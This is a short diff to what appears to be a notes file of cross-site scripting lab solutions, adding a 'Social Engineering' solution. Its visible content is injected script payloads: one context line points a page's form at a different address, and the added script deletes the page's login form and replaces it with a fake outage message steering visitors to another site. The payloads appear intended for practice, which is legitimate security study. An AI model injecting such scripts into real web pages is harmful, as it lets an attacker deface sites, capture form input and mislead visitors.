@@ -56,3 +56,17 @@ document.forms[0].insertBefore(input, previous);
 document.forms[0].action = "http://localhost/";
 
 </script>
+
+
+* Solution 5: Social Engineering
+
+<script>
+
+var input = document.createElement("h2 ");
+
+input.innerHTML = "Website is Down. Please visit SecurityTube.net";
+
+document.forms[0].parentNode.appendChild(input);
+document.forms[0].parentNode.removeChild(document.forms[0]);
+
+</script>
